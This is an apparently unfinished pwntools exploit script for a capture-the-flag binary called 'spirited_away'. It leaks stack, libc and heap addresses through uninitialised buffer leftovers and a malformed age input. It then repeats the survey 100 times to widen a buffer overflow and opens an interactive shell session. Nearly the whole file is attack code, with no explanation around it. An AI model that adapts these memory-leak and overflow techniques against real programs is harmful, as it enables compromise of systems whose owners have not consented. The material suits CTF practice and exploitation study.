#!/usr/bin/env python3
from pwn import *

PAD = lambda n: b"a" * n
DUMMY = 0xdeadbeef

elf = ELF("./spirited_away_patched")
libc = ELF("./given/libc_32.so.6")
ld = ELF("./ld-2.23.so")

if args.REMOTE:
    p = remote()
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        context.terminal = ["tmux", "splitw", "-h"]
        gdb.attach(p, "\n".join(
                   ["b *0x80488d3", # survey's leave
                   ]))

def do_survey(name=PAD(0x3c), age=b"2147483647",
              reason=PAD(0x50), comment=PAD(0x3c), repeat=b"y"):
    p.sendafter(b"Please enter your name: ", name)
    p.sendlineafter(b"Please enter your age: ", age)
    p.sendafter(b"Why did you came to see this movie? ", reason)
    p.sendafter(b"Please enter your comment: ", comment)

    p.recvuntil(b"Name: ")
    name_buf_leak = p.recvuntil(b"Age: ")[:-5]
    p.recvuntil(b"Reason: ")
    reason_buf_leak = p.recvuntil(b"Comment: ")[:-9]
    leak = p.recvuntil(b"comment so far.").split(b"\n")
    comment_buf_leak, times_record = leak[0], leak[-1]
    log.debug(times_record)
    p.sendlineafter(b"Would you like to leave another comment? <y/n>:", repeat)
    return [name_buf_leak, reason_buf_leak, comment_buf_leak]

def leak_heap():
    _, _, comment  = do_survey(comment=PAD(0x50))
    heap_leak = u32(comment[0x54:0x58])
    log.info("heap leak: " + hex(heap_leak))
    return heap_leak

def leak_stack():
    _, reason, _ = do_survey(age=p32(DUMMY), reason=PAD(0x50))
    saved_ebp_leak = u32(reason[0x50: 0x54])
    log.info("stack leak: " + hex(saved_ebp_leak))
    return saved_ebp_leak

def leak_libc_base():
    _, reason, _ = do_survey(reason=PAD(0x50))
    # a stack leftover on main()
    libc_leak = u32(reason[0x58: 0x5c])
    log.info("libc leak: " + hex(libc_leak))
    return libc_leak

def exploit():

    saved_ebp_leak = leak_stack()

    libc_leak = leak_libc_base()
    libc.address = libc_leak + 0xf7d78000 - 0xf7f28d60

    # do_survey 100 times to overflow on comment buffer
    # invalid %d format string for "age" allow us to leak stack leftover
    for _ in range(100):
        do_survey()
    # from now on comment/name buffer can write 0x6e

    # pad comment buffer to leak libc/heap
    heap_leak = leak_heap()

    do_survey(repeat=b"n")
    p.interactive()

if __name__ == "__main__":
    exploit()
